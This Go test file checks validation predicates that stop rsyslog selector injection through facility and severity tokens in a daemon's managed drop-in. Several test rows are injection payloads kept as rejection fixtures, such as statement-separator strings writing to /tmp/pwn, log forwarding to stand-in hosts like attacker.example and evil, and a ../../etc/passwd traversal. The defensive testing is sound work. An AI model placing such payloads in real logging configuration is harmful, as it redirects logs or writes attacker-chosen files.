package daemon

import (
	"math/rand"
	"strings"
	"testing"
)

// #5797 invariant 7, render-belt half.
//
// syslogDropinContents builds an rsyslog selector line
// `<facility>.<severity>\t<target>` from config tokens and writes it to a
// managed drop-in under /etc/rsyslog.d. #4902 belted the file NAME and the
// user TOKEN on that exact line but left the two SELECTOR tokens unchecked, so
// an rsyslog metacharacter in a facility/severity escaped the selector and
// injected configuration. syslogSelectorFacilitySafe /
// syslogSelectorSeveritySafe close that.
//
// SCOPE OF THIS FILE: it tests the PREDICATES in isolation, and that is not the
// same as testing the fix. The shipped protection is the two
// `if !syslogSelector...Safe(...)` guards at the render site; every test
// here stays green if both are deleted. syslog_selector_render_5797_test.go
// is what binds those call sites — do not treat this file as covering them.
//
// The belt is a SHAPE check on purpose. Deciding which facility NAMES are
// honoured means reconciling the Junos vocabulary (`authorization`, `kernel`,
// `interactive-commands`) against the BSD/rsyslog names the runtime maps
// (`auth`, `kern`) — an operator-visible mapping change deferred on #5797.
// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 pins that the belt does
// NOT pre-empt that decision by rejecting names the runtime cannot yet map.
//
// The shape is POSITION-AWARE. An earlier revision applied one byte-allowlist
// to both positions, which is necessarily the INTERSECTION of two different
// grammars and so dropped native syntax from each — see
// TestSyslogSelectorNativeSyntaxAccepted_6829 for what that cost and
// TestSyslogSelectorPositionsAreNotInterchangeable_6829 for why one predicate
// cannot serve both.

// TestSyslogSelectorTokenRejectsInjection_5797 is the fail-on-revert guard.
// Reverting either belt call site makes the corresponding destination render a
// drop-in built from these tokens.
//
// Every row is asserted against BOTH position predicates: these are structural
// escapes, and no rsyslog position accepts them.
func TestSyslogSelectorTokenRejectsInjection_5797(t *testing.T) {
	cases := []struct {
		name string
		tok  string
	}{
		// The motivating vector for #5797: a `;` ends the selector and what
		// follows is parsed by rsyslog as its own directive. This row is the
		// load-bearing one — it is the string that passes commit-check.
		{"statement separator", "daemon;*.*"},
		{"statement separator with action", "daemon;*.* /tmp/pwn"},
		// ISOLATED metacharacters. The two rows above carry a `;` AND a `*`
		// AND a `.` AND (in the second) a space, so each is rejected four times
		// over and a mutation admitting any ONE of those bytes leaves them
		// green — measured, not assumed: adding `case c == ';'` to
		// syslogSelectorAtomSafe left this whole test passing until these rows
		// existed. Every byte the belt rejects for structural reasons gets a
		// row where it is the ONLY unsafe byte, so each one binds on its own
		// instead of being masked by its neighbours.
		{"statement separator alone", "daemon;x"},
		{"statement separator between two real facilities", "auth;authpriv"},
		{"slash alone", "var/log/pwn"},
		{"wildcard glued to a name", "daemon*"},
		{"equals inside a facility", "daemon=info"},
		// A newline would end the line outright. Not reachable through the
		// config surface (the lexer folds it to a space) but rejected anyway.
		{"embedded newline", "daemon\n*.* @@attacker.example:514"},
		{"embedded CR", "daemon\r*.* /tmp/pwn"},
		// Selector grammar: the `.` already separates facility from priority.
		{"selector dot", "daemon.info"},
		{"colon action prefix", "daemon:omusrmsg:root"},
		// Whitespace splits the selector from its action field.
		{"space", "daemon info"},
		{"tab", "daemon\tinfo"},
		// Control bytes.
		{"NUL", "daemon\x00"},
		{"DEL", "daemon\x7f"},
		// Path traversal in a token that reaches a written file's content.
		{"slash", "../../etc/passwd"},
		// EMPTY LIST MEMBERS. The comma is admitted in the facility position
		// (see TestSyslogSelectorNativeSyntaxAccepted_6829), which makes
		// "is every member a real atom?" the load-bearing question rather than
		// "does the token contain a comma?". A malformed list must not ride in
		// on the comma's admission.
		{"trailing empty atom", "auth,"},
		{"leading empty atom", ",auth"},
		{"interior empty atom", "auth,,authpriv"},
		{"comma only", ","},
		// The comma is admitted PER ATOM, not as a blanket pass: a list whose
		// members are individually unsafe is still an injection. This is the row
		// that fails if the list check is written as "contains a comma -> safe".
		{"list member carries a statement separator", "auth,authpriv;*.* /tmp/pwn"},
		{"list member carries a space", "auth,authpriv @@collector.example:514"},
		{"list member is a wildcard-plus-payload", "auth,* /tmp/pwn"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if syslogSelectorFacilitySafe(c.tok) {
				t.Errorf("FACILITY token %q accepted as safe; it can escape the rsyslog "+
					"selector line and inject configuration (#5797)", c.tok)
			}
			if syslogSelectorSeveritySafe(c.tok) {
				t.Errorf("SEVERITY token %q accepted as safe; it can escape the rsyslog "+
					"selector line and inject configuration (#5797)", c.tok)
			}
		})
	}
}

// TestSyslogSelectorNativeSyntaxAccepted_6829 holds the rows an earlier
// revision of this file listed as UNSAFE, claiming each "can escape the rsyslog
// selector line and inject configuration". That claim was false for both, and
// asserting it cost real configurations.
//
// The render is `fmt.Sprintf("%s.%s", facility, severity)`. A whole-token `*`
// can therefore only ever produce `*.<severity>` — one byte, no room for an
// embedded payload — and `*` is rsyslog's own spelling for all facilities
// (rsyslog.conf(5): "an asterisk stands for all facilities or all priorities,
// depending on where it is used"). A comma list is likewise native: "you can
// specify multiple facilities with the same priority pattern in one statement
// using the comma operator". `auth,authpriv` renders `auth,authpriv.info`.
//
// Neither is exotic. Both pass SchemaValidate (the facility is the schema's
// unvalidated wildcard KEY) and compile verbatim, and both rendered a working
// drop-in before any belt existed — so rejecting them did not harden anything,
// it warned-and-reconciled-away a strict-commit-clean destination on upgrade.
//
// The empty-atom and payload-carrying rows in
// TestSyslogSelectorTokenRejectsInjection_5797 are the other half of this: the
// comma is admitted per atom, so admitting `auth,authpriv` does not admit
// `auth,authpriv;*.* /tmp/pwn`.
func TestSyslogSelectorNativeSyntaxAccepted_6829(t *testing.T) {
	t.Run("facility", func(t *testing.T) {
		for _, tok := range []string{
			// Whole-token wildcard.
			"*",
			// Comma lists, including the rsyslog documentation's own example
			// shape and a Junos-spelled pair the runtime cannot map.
			"auth,authpriv",
			"daemon,auth",
			"kern,user",
			"auth,authpriv,daemon",
			"authorization,interactive-commands",
			"local0,local1,local2,local3,local4,local5,local6,local7",
		} {
			if !syslogSelectorFacilitySafe(tok) {
				t.Errorf("native rsyslog facility syntax %q rejected. It cannot escape the "+
					"selector — the render is fmt.Sprintf(%q, facility, severity) — and it "+
					"passes commit-check, so rejecting it silently deletes a working "+
					"destination on upgrade (#5797/#6829)", tok, "%s.%s")
			}
		}
	})

	t.Run("severity", func(t *testing.T) {
		for _, tok := range []string{
			// Whole-token wildcard: `daemon.*`.
			"*",
			// rsyslog's priority modifiers (rsyslog.conf(5)): `=` for exactly
			// this priority, `!` to exclude, and the two combined.
			"=info",
			"!info",
			"!=info",
			"=emergency",
			"!=warning",
			// A modifier in front of the wildcard is constructible and inert.
			// All THREE modifiers, including the combined `!=` — the declared
			// grammar is `("" | "=" | "!" | "!=") ("*" | atom)`, so omitting
			// `!=*` would leave one arm of that product with no positive
			// fixture and a later narrowing of it would go unnoticed.
			"!*",
			"=*",
			"!=*",
		} {
			if !syslogSelectorSeveritySafe(tok) {
				t.Errorf("native rsyslog priority syntax %q rejected — these are the "+
					"documented `=`/`!`/`!=` modifiers and the `*` wildcard, none of which "+
					"can alter the structure of the rendered line (#5797/#6829)", tok)
			}
		}
	})
}

// TestSyslogSelectorPositionsAreNotInterchangeable_6829 is what makes this
// belt POSITION-aware rather than one predicate called twice. It is the test
// that fails if a later change collapses the two predicates back into one —
// in either direction, which a single-position test cannot do.
//
// rsyslog's two selector positions have genuinely different grammars:
//
//   - the comma operator is facility-side only. rsyslog.conf(5) specifies
//     multiple facilities "with the same priority pattern"; the priority is a
//     single keyword. Multiple priorities are written as `;`-joined selectors
//     (`kern.*;kern.!err`), and `;` is exactly what this belt rejects. So
//     `daemon.info,err` was never a valid selector and admitting it would widen
//     the accept set while recovering nothing.
//   - the `=`/`!`/`!=` modifiers are priority-side only. `!daemon.info` is not
//     a facility with a modifier; a leading `!` at the start of a sysklogd-format
//     LINE is the program-name filter (`!prog`), a different construct entirely.
//
// A union predicate would accept both everywhere; an intersection predicate
// (the earlier revision) accepts neither anywhere. Both are wrong, and this
// pins which side each belongs to.
func TestSyslogSelectorPositionsAreNotInterchangeable_6829(t *testing.T) {
	t.Run("comma lists are facility-only", func(t *testing.T) {
		for _, tok := range []string{"auth,authpriv", "kern,user", "daemon,auth"} {
			if !syslogSelectorFacilitySafe(tok) {
				t.Errorf("facility %q must be accepted: the comma operator is native here", tok)
			}
			if syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q must be REJECTED: the comma operator is defined on the "+
					"facility side only, so this never rendered a valid selector. Accepting "+
					"it means the two positions share one predicate, which is the shape this "+
					"fix exists to replace (#6829)", tok)
			}
		}
		// The bare priority list, spelled without a facility.
		if syslogSelectorSeveritySafe("info,err") {
			t.Errorf("severity \"info,err\" accepted — rsyslog's priority position takes a " +
				"single keyword; multiple priorities are `;`-joined selectors, and `;` is " +
				"the byte this belt rejects (#6829)")
		}
	})

	t.Run("priority modifiers are severity-only", func(t *testing.T) {
		for _, tok := range []string{"=info", "!info", "!=info"} {
			if !syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q must be accepted: `=`/`!`/`!=` are native priority "+
					"modifiers", tok)
			}
			if syslogSelectorFacilitySafe(tok) {
				t.Errorf("facility %q must be REJECTED: the modifiers belong to the priority "+
					"position, and a leading `!` at the start of a sysklogd-format line is the "+
					"program-name filter, not a facility (#6829)", tok)
			}
		}
	})

	t.Run("a bare modifier names no priority", func(t *testing.T) {
		// Stripping the prefix must leave a real atom behind. `!`, `=` and `!=`
		// alone leave nothing, and an empty priority is not a selector.
		for _, tok := range []string{"!", "=", "!="} {
			if syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q accepted: the modifier prefix was stripped and nothing "+
					"was checked behind it, so an empty priority renders `daemon.%s` (#6829)",
					tok, tok)
			}
		}
		// rsyslog.conf(5): "the exclamation mark must occur before the equals
		// sign". Only the three legal prefixes are stripped, so the illegal
		// ordering falls through to the atom check and is rejected for free.
		if syslogSelectorSeveritySafe("=!info") {
			t.Errorf("severity \"=!info\" accepted — rsyslog requires the exclamation mark " +
				"BEFORE the equals sign, so this ordering is not valid syntax (#6829)")
		}
	})
}

// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 is the over-rejection
// guard. It is the reason this belt is a shape check: it must accept every
// legitimate Junos facility/severity spelling — INCLUDING the Junos names the
// runtime does not yet map to a numeric facility — so the belt cannot silently
// pre-empt the deferred mapping decision by dropping valid destinations.
func TestSyslogSelectorTokenAcceptsJunosVocabulary_5797(t *testing.T) {
	safe := []string{
		// Empty: both call sites map it to the `*` wildcard, so it is ordinary
		// configuration rather than an omission.
		"",
		// Facilities the runtime maps today.
		"kern", "user", "daemon", "auth", "syslog", "change-log",
		"local0", "local1", "local2", "local3", "local4", "local5", "local6", "local7",
		// Junos facility names the runtime does NOT yet map. These must still
		// render — rejecting them here would turn a deferred mapping decision
		// into a silent loss of the destination.
		"authorization", "kernel", "interactive-commands", "conflict-log",
		"pfe", "security", "firewall", "external", "ftp", "ntp", "dfc",
		// Severities.
		"any", "none", "emergency", "alert", "critical",
		"error", "warning", "notice", "info", "debug",
		// Safe-shaped names that belong to NO vocabulary listed above, present
		// so a "hardcoded set of exactly the fixtures above" implementation
		// fails here. See TestSyslogSelectorTokenIsAShapeNotAList_5797 for the
		// form of that argument that a fixture cannot be added to.
		"audit-log", "local8", "vendor-specific-9",
	}
	for _, tok := range safe {
		if !syslogSelectorFacilitySafe(tok) {
			t.Errorf("legitimate syslog FACILITY token %q rejected — the belt is scoped "+
				"wider than the injection surface it guards", tok)
		}
		if !syslogSelectorSeveritySafe(tok) {
			t.Errorf("legitimate syslog SEVERITY token %q rejected — the belt is scoped "+
				"wider than the injection surface it guards", tok)
		}
	}
}

// TestSyslogSelectorTokenIsAShapeNotAList_5797 closes the blind spot the
// fixture list above cannot close on its own. Every name written into a fixture
// list becomes part of that list, so "accepts the Junos vocabulary" is equally
// satisfied by a hardcoded set containing exactly those names — an
// implementation that would then reject the next safe-shaped facility somebody
// configures, silently dropping their destination. That failure mode is this
// issue's own history: the accept set IS the decision.
//
// This pins the predicates as a SHAPE rather than a membership test, in the one
// form no fixture can be retrofitted into:
//
//   - exhaustively over all 256 byte values, for the ATOM and for each POSITION
//     — a set-membership implementation fails on the first unlisted letter;
//   - over randomly generated safe-shaped tokens, which by construction are
//     not in any list a maintainer could have written.
//
// It is deliberately a restatement of the accept CLASS, because that class is
// the security decision: everything in it is inert inside an rsyslog selector,
// everything outside it can alter the line's structure.
func TestSyslogSelectorTokenIsAShapeNotAList_5797(t *testing.T) {
	const accepted = syslogSelectorAcceptedAtomBytes
	const lead = syslogSelectorAcceptedLeadBytes

	// The ATOM: one facility name, or one priority name. No positional syntax.
	for b := 0; b < 256; b++ {
		tok := string([]byte{byte(b)})
		// A ONE-BYTE atom is entirely its own first byte, so the LEAD class
		// applies, not the interior class. #6829 B1: the hyphen is the one byte
		// where the two differ, and using the interior class here is what let
		// the bare `-` through.
		want := syslogSelectorAtomLeadByte(b)
		if got := syslogSelectorAtomSafe(tok); got != want {
			if want {
				t.Errorf("atom byte %#x (%q) rejected: the belt is a membership test, not a shape "+
					"check — the next safe-shaped facility an operator writes will be dropped", b, tok)
			} else {
				t.Errorf("atom byte %#x (%q) accepted: it can alter the structure of the rendered "+
					"rsyslog selector line", b, tok)
			}
		}
	}

	// Each POSITION: the atom class plus exactly one extra byte, `*`. Pinning
	// this exhaustively is what stops the positional relaxation from being
	// widened by one more metacharacter later — `;`, `.`, `:` and the space all
	// have to stay out, in both positions, and this fails on the first one
	// admitted.
	for b := 0; b < 256; b++ {
		tok := string([]byte{byte(b)})
		// Offset 0 again: a single-byte token is a single-byte atom.
		want := syslogSelectorAtomLeadByte(b) || b == '*'
		if got := syslogSelectorFacilitySafe(tok); got != want {
			t.Errorf("facility byte %#x (%q) = %v, want %v — the facility position accepts the "+
				"atom class plus the whole-token `*` wildcard, and nothing else", b, tok, got, want)
		}
		if got := syslogSelectorSeveritySafe(tok); got != want {
			t.Errorf("severity byte %#x (%q) = %v, want %v — the priority position accepts the "+
				"atom class plus the `*` wildcard; the `=`/`!` modifiers are prefixes and name "+
				"no priority on their own", b, tok, got, want)
		}
	}

	// Randomly generated safe-shaped tokens. Fixed seed: a failure is
	// reproducible, and the corpus is still outside any hand-written list.
	rng := rand.New(rand.NewSource(5797))
	for i := 0; i < 500; i++ {
		n := 1 + rng.Intn(24)
		var sb strings.Builder
		// The FIRST byte is drawn from the lead class and the rest from the
		// interior class, so the corpus is safe-shaped under the real belt
		// rather than under a position-blind approximation of it. Drawing the
		// head from the interior class would generate `-foo`, which the belt
		// correctly rejects — the generator would be manufacturing failures.
		sb.WriteByte(lead[rng.Intn(len(lead))])
		for j := 1; j < n; j++ {
			sb.WriteByte(accepted[rng.Intn(len(accepted))])
		}
		tok := sb.String()
		if !syslogSelectorAtomSafe(tok) {
			t.Fatalf("generated safe-shaped atom %q rejected — the belt cannot be a list of "+
				"known facility names; it must accept the whole [A-Za-z0-9-] shape", tok)
		}
		if !syslogSelectorFacilitySafe(tok) || !syslogSelectorSeveritySafe(tok) {
			t.Fatalf("generated safe-shaped token %q rejected by a position predicate", tok)
		}
		// The same corpus assembled into a comma list must survive the facility
		// position: the list rule is per-atom, so anything the atom accepts a
		// list of those atoms accepts too.
		if list := tok + "," + tok; !syslogSelectorFacilitySafe(list) {
			t.Fatalf("generated safe-shaped facility list %q rejected — the comma operator is "+
				"native rsyslog and the members are individually safe", list)
		}
	}
}

// TestSyslogSelectorTokenSpaceIsUnsafe_5797 pins the specific byte the
// reachability trace turned on. A literal newline cannot reach these tokens —
// the lexer normalizes \n and \t inside a quoted value to a SPACE — so the
// belt's value does not rest on newline rejection. It rests on rejecting the
// space, because the emitted line is `<facility>.<severity>\t<target>` and
// rsyslog's grammar is `<selector><whitespace><action>`: a space inside the
// token is what lets attacker-chosen text reach the ACTION position.
//
// If a future edit relaxes this to "printable ASCII" or "no control bytes",
// the belt still rejects newlines (which were never reachable) while admitting
// the space (which is), i.e. it would look correct and guard nothing. This
// test fails on exactly that relaxation, in both positions.
func TestSyslogSelectorTokenSpaceIsUnsafe_5797(t *testing.T) {
	for _, tok := range []string{
		"daemon local7",
		"* @@collector.example:514",
		"info *.* @@evil:514",
		" ",
		"daemon ",
		// The space must not ride in on either positional relaxation: not as a
		// comma-list member, and not behind a priority modifier.
		"auth,authpriv @@collector.example:514",
		"=info @@collector.example:514",
		"!info /tmp/pwn",
	} {
		if syslogSelectorFacilitySafe(tok) {
			t.Errorf("FACILITY token %q accepted: a SPACE separates the rsyslog selector from "+
				"its action, so this reaches the action position of a managed drop-in. The "+
				"newline this belt appears to guard is NOT reachable (the lexer folds it "+
				"to a space) — the space is the live byte (#5797)", tok)
		}
		if syslogSelectorSeveritySafe(tok) {
			t.Errorf("SEVERITY token %q accepted: a SPACE reaches the action position of a "+
				"managed drop-in (#5797)", tok)
		}
	}
}

// syslogSelectorAcceptedAtomBytes is the accept class for a byte INSIDE an
// atom: [A-Za-z0-9-]. It is stated once because two independently written
// copies of a security decision disagree silently until somebody widens one of
// them.
const syslogSelectorAcceptedAtomBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"

// syslogSelectorAcceptedLeadBytes is the accept class for the FIRST byte of an
// atom: [A-Za-z0-9], i.e. the interior class MINUS the hyphen.
//
// #6829 B1: the two classes are not the same, and treating them as one is what
// let `-host` through. A leading hyphen makes the rendered line a legacy
// sysklogd/rsyslog HOSTNAME-FILTER directive rather than a facility selector,
// which re-scopes every selector after it — a construct substitution, not a
// cosmetic byte. Interior hyphens stay legal (`interactive-commands`).
const syslogSelectorAcceptedLeadBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// syslogSelectorAtomByte reports whether byte b is accepted at a NON-LEADING
// offset of an atom. syslogSelectorAtomLeadByte is its offset-0 counterpart.
//
// The exhaustive scans below express their expected partition as a function of
// whichever of the two applies at that exact offset, plus the positional syntax
// legal there, so each scan pins the FULL accept/reject split rather than "some
// bytes are rejected". Picking the wrong one of the pair is the mistake that
// makes a scan assert the belt is MORE permissive than it is.
func syslogSelectorAtomByte(b int) bool {
	return strings.ContainsRune(syslogSelectorAcceptedAtomBytes, rune(b))
}

// syslogSelectorAtomLeadByte reports whether byte b is accepted as the FIRST
// byte of an atom.
func syslogSelectorAtomLeadByte(b int) bool {
	return strings.ContainsRune(syslogSelectorAcceptedLeadBytes, rune(b))
}

// TestSyslogSelectorSeverityModifierSuffixExhaustive_6829 closes the half of
// TestSyslogSelectorTokenIsAShapeNotAList_5797 that the SINGLE-BYTE scan cannot
// reach.
//
// That scan builds `string([]byte{byte(b)})` — one byte, no prefix — so it is
// complete by construction for the UNMODIFIED priority and blind to everything
// behind a modifier. The severity grammar is
// `("" | "=" | "!" | "!=") ("*" | atom)`, and until this test existed the
// `=`/`!`/`!=` arms were pinned by exactly five hand-written positives
// (`=info`, `!info`, `!=info`, `=emergency`, `!=warning`), three bare-modifier
// negatives (`!`, `=`, `!=`), one ordering negative (`=!info`) — and NO invalid
// `!=<suffix>` at all.
//
// That leaves a whole class of regression invisible. Measured, not assumed:
// replacing the `!=` arm of syslogSelectorSeveritySafe with
// `return len(rest) > 2` — accept ANY nonempty suffix after `!=` — keeps every
// one of those fixtures green (the positives still pass, bare `!=` is still
// rejected for its length, and the one-byte scan never constructs a token
// starting with `!=`), while `!=;*.* /tmp/pwn` becomes an accepted severity.
// The whole current suite passes that edit. This test fails it.
//
// Two contexts per modifier, because they have DIFFERENT partitions and testing
// only their intersection would re-create the masking this file already fought:
//
//   - as the WHOLE suffix, `*` is legal — `!=*` is the wildcard priority with
//     the negated-exact modifier in front of it;
//   - EMBEDDED in a longer suffix, `*` is not — `!=in*fo` names no priority and
//     the belt must reject it. A scan that only tested the intersection would
//     silently accept `*` everywhere or reject it everywhere.
//
// The facility half of every row is asserted too: none of these tokens may
// enter the facility position, since a leading `!` there is the sysklogd
// program-name filter, not a facility.
func TestSyslogSelectorSeverityModifierSuffixExhaustive_6829(t *testing.T) {
	for _, prefix := range []string{"=", "!", "!="} {
		t.Run("whole suffix after "+prefix, func(t *testing.T) {
			for b := 0; b < 256; b++ {
				tok := prefix + string([]byte{byte(b)})
				// The suffix IS the priority, so the whole-token `*` wildcard is
				// legal here exactly as it is with no modifier. Note the one
				// coincidence: at prefix `!` and b == '=' the token is the bare
				// `!=`, whose suffix is empty — and `=` is outside the atom
				// class, so the same expression already predicts the rejection.
				// The suffix is the whole priority, so its first byte is an
				// atom's offset 0 — the LEAD class, not the interior one.
				want := syslogSelectorAtomLeadByte(b) || b == '*'
				if got := syslogSelectorSeveritySafe(tok); got != want {
					if want {
						t.Errorf("severity %q = false, want true: byte %#x is a legal priority "+
							"behind the %q modifier, and rejecting it deletes a working "+
							"destination on upgrade (#6829)", tok, b, prefix)
					} else {
						t.Errorf("severity %q = true, want false: byte %#x rode in behind the %q "+
							"modifier. The modifier arms are the one part of the priority "+
							"grammar the single-byte scan cannot reach, so a change that "+
							"loosened them would otherwise be invisible (#6829)", tok, b, prefix)
					}
				}
				if syslogSelectorFacilitySafe(tok) {
					t.Errorf("facility %q accepted: the %q modifier belongs to the priority "+
						"position, and a leading `!` at the start of a sysklogd-format line "+
						"is the program-name filter (#6829)", tok, prefix)
				}
			}
		})

		t.Run("byte embedded in the suffix after "+prefix, func(t *testing.T) {
			for b := 0; b < 256; b++ {
				tok := prefix + "in" + string([]byte{byte(b)}) + "fo"
				// Here the suffix is a multi-byte priority NAME, so it must be a
				// plain atom: `*` is the whole-token wildcard and is NOT legal
				// infix. This is the partition difference the two scans exist to
				// state separately.
				want := syslogSelectorAtomByte(b)
				if got := syslogSelectorSeveritySafe(tok); got != want {
					if want {
						t.Errorf("severity %q = false, want true: byte %#x is inside the atom "+
							"class, so a multi-character priority name containing it is "+
							"legitimate configuration (#6829)", tok, b)
					} else {
						t.Errorf("severity %q = true, want false: byte %#x is embedded in the "+
							"priority NAME behind the %q modifier. A suffix rule that checks "+
							"only the first byte, or only the length, leaves exactly this "+
							"class of payload admitted (#6829)", tok, b, prefix)
					}
				}
				if syslogSelectorFacilitySafe(tok) {
					t.Errorf("facility %q accepted: priority modifiers are severity-only (#6829)", tok)
				}
			}
		})
	}
}

// TestSyslogSelectorFacilityListMemberExhaustive_6829 does for the comma
// operator what the test above does for the priority modifiers.
//
// The facility grammar is `"" | "*" | atom("," atom)*`, and the list arm was
// pinned by clean positives plus six negatives — every one of which carried
// SEVERAL forbidden bytes at once. `auth,authpriv;*.* /tmp/pwn` is declined for
// its `;` AND its `*` AND its `.` AND its space AND its `/`, so a list rule
// that admitted only the `;` stayed green. Measured, not assumed: stripping `;`
// from each member before the atom check, but only when the token actually has
// more than one member, passes the entire current suite — the single-member
// rows (`daemon;x`, `auth;authpriv`) are untouched by it because they have no
// comma, the empty-member rows still fail on emptiness, the payload rows still
// fail on their other bytes, and the one-byte scan never constructs a list.
// The embedded-byte scan below fails that edit at b == ';'.
//
// Every member POSITION is scanned. A scan of the first member alone would
// leave the middle and the last masked in precisely the same way — the code
// walks `strings.Split`, so an off-by-one or a "check the head, trust the tail"
// rewrite is a real shape, not a hypothetical one.
//
// The two contexts have different partitions, and the difference is the point:
//
//   - as a WHOLE member, `*` is rejected. It is the whole-TOKEN wildcard only;
//     `auth,*` is degenerate (the `*` already means every facility) and was
//     never admitted;
//   - EMBEDDED in a member, `,` is ACCEPTED — it is the list operator, so
//     `priv,log` is simply two safe members. As a whole member it is rejected,
//     because that leaves an empty member on each side.
func TestSyslogSelectorFacilityListMemberExhaustive_6829(t *testing.T) {
	positions := []struct {
		name   string
		render func(member string) string
	}{
		{"first", func(m string) string { return m + ",auth,daemon" }},
		{"middle", func(m string) string { return "auth," + m + ",daemon" }},
		{"last", func(m string) string { return "auth,daemon," + m }},
	}

	for _, p := range positions {
		t.Run("byte is the whole "+p.name+" member", func(t *testing.T) {
			for b := 0; b < 256; b++ {
				tok := p.render(string([]byte{byte(b)}))
				// A member is an atom and nothing else. `*` does not get in
				// here, and `,` produces an empty member on both sides. The byte
				// is the WHOLE member, so it sits at offset 0 and the LEAD class
				// applies.
				want := syslogSelectorAtomLeadByte(b)
				if got := syslogSelectorFacilitySafe(tok); got != want {
					if want {
						t.Errorf("facility %q = false, want true: byte %#x is a one-character "+
							"atom and a legal %s list member, so rejecting it warns-and-"+
							"reconciles-away a commit-clean destination (#6829)", tok, b, p.name)
					} else {
						t.Errorf("facility %q = true, want false: byte %#x was admitted as the "+
							"%s list member. The comma is admitted PER MEMBER; a rule that "+
							"relaxes what a member may contain re-opens the injection the "+
							"belt exists for (#6829)", tok, b, p.name)
					}
				}
				if syslogSelectorSeveritySafe(tok) {
					t.Errorf("severity %q accepted: the comma operator is defined on the "+
						"facility side only, so no comma list is a valid priority (#6829)", tok)
				}
			}
		})

		t.Run("byte embedded in the "+p.name+" member", func(t *testing.T) {
			for b := 0; b < 256; b++ {
				tok := p.render("priv" + string([]byte{byte(b)}) + "log")
				// A comma here just splits one safe member into two safe
				// members, which is native list syntax and stays accepted. Every
				// other non-atom byte is a payload inside a member — the exact
				// shape every existing list negative masks behind four other
				// forbidden bytes.
				want := syslogSelectorAtomByte(b) || b == ','
				if got := syslogSelectorFacilitySafe(tok); got != want {
					if want {
						t.Errorf("facility %q = false, want true: byte %#x leaves every member a "+
							"safe atom, so this is an ordinary multi-character %s member "+
							"(#6829)", tok, b, p.name)
					} else {
						t.Errorf("facility %q = true, want false: byte %#x is embedded INSIDE the "+
							"%s list member. Every hand-written negative for this position "+
							"carries several forbidden bytes at once, so a change admitting "+
							"just this one is invisible without this scan (#6829)", tok, b, p.name)
					}
				}
				if syslogSelectorSeveritySafe(tok) {
					t.Errorf("severity %q accepted: comma lists are facility-only (#6829)", tok)
				}
			}
		})
	}
}

// TestSyslogSelectorMultiByteAtomExhaustive_6829 covers the remaining
// multi-character context: a single facility/priority NAME with no positional
// syntax around it at all. `daemon`, `interactive-commands` and `local7` are
// all several bytes long, and the single-byte scan says nothing about a byte
// appearing at offset 3 of a token.
//
// It also states the last positional difference explicitly. A comma INSIDE a
// bare token is inert in the facility position — it makes the token a two-member
// list — and fatal in the priority position, where the comma operator does not
// exist. That asymmetry is the whole reason there are two predicates, and until
// now it rested on three hand-written pairs.
func TestSyslogSelectorMultiByteAtomExhaustive_6829(t *testing.T) {
	for b := 0; b < 256; b++ {
		tok := "dae" + string([]byte{byte(b)}) + "mon"
		wantFacility := syslogSelectorAtomByte(b) || b == ','
		wantSeverity := syslogSelectorAtomByte(b)

		if got := syslogSelectorFacilitySafe(tok); got != wantFacility {
			t.Errorf("facility %q = %v, want %v: byte %#x at offset 3 of a facility name. "+
				"The facility position accepts the atom class plus the comma list operator "+
				"and nothing else (#6829)", tok, got, wantFacility, b)
		}
		if got := syslogSelectorSeveritySafe(tok); got != wantSeverity {
			t.Errorf("severity %q = %v, want %v: byte %#x at offset 3 of a priority name. "+
				"The priority position takes a single keyword — the comma that is native "+
				"one field to the left is not native here (#6829)", tok, got, wantSeverity, b)
		}
	}
}

// TestSyslogSelectorPayloadsOneByteAtATime_6829 is the readable companion to
// the three scans above: the same regressions, named, with a positive control
// that differs from each negative by EXACTLY one byte.
//
// The discipline matters. This file's history is a row that was rejected four
// times over proving nothing about any one of the four bytes; every negative
// here is its own accepted base plus a single forbidden character, so the byte
// under test is the only thing that can be deciding the outcome.
func TestSyslogSelectorPayloadsOneByteAtATime_6829(t *testing.T) {
	t.Run("severity modifier suffixes", func(t *testing.T) {
		// Positive controls. Each negative below is one of these plus one byte,
		// so a belt that regressed to rejecting everything fails here first.
		for _, base := range []string{"=info", "!info", "!=info"} {
			if !syslogSelectorSeveritySafe(base) {
				t.Fatalf("premise broken: %q must be accepted — it is a documented rsyslog "+
					"priority modifier applied to a real priority", base)
			}
		}
		for _, tok := range []string{
			// `!=` had no invalid suffix fixture at all before #6829 round 3.
			"!=info;", "!=info.", "!=info ", "!=info,", "!=info*", "!=info/", "!=info:",
			// The payload ahead of the name, not only after it.
			"!=;info", "!= info",
			// The same one-byte discipline for the other two modifiers.
			"=info;", "=info ", "=info*",
			"!info;", "!info ", "!info*",
		} {
			if syslogSelectorSeveritySafe(tok) {
				t.Errorf("severity %q accepted. It is an accepted base plus ONE forbidden "+
					"byte, so nothing else can be carrying the rejection: the modifier arm "+
					"admits a payload (#6829)", tok)
			}
		}
	})

	t.Run("facility list members", func(t *testing.T) {
		for _, base := range []string{"auth,authpriv", "auth,daemon,syslog"} {
			if !syslogSelectorFacilitySafe(base) {
				t.Fatalf("premise broken: %q must be accepted — the comma operator is native "+
					"rsyslog facility syntax", base)
			}
		}
		for _, tok := range []string{
			// One forbidden byte inside ONE member, at each member position.
			// The `;` rows are the ones an existing negative masks behind its
			// `*`, `.`, space and `/`.
			"auth;priv,daemon", "auth,auth;priv", "auth,daemon,sys;log",
			"auth.priv,daemon", "auth,auth.priv", "auth,daemon,sys.log",
			"auth priv,daemon", "auth,auth priv", "auth,daemon,sys log",
			"auth*priv,daemon", "auth,auth*priv", "auth,daemon,sys*log",
			"auth/priv,daemon", "auth,auth/priv", "auth,daemon,sys/log",
			// `*` as a whole member: the wildcard is whole-TOKEN only.
			"*,auth", "auth,*", "auth,*,daemon",
		} {
			if syslogSelectorFacilitySafe(tok) {
				t.Errorf("facility %q accepted. It is an accepted list plus ONE forbidden "+
					"byte in a single member, so the comma admission has degraded into a "+
					"blanket pass on the token (#6829)", tok)
			}
		}
	})
}
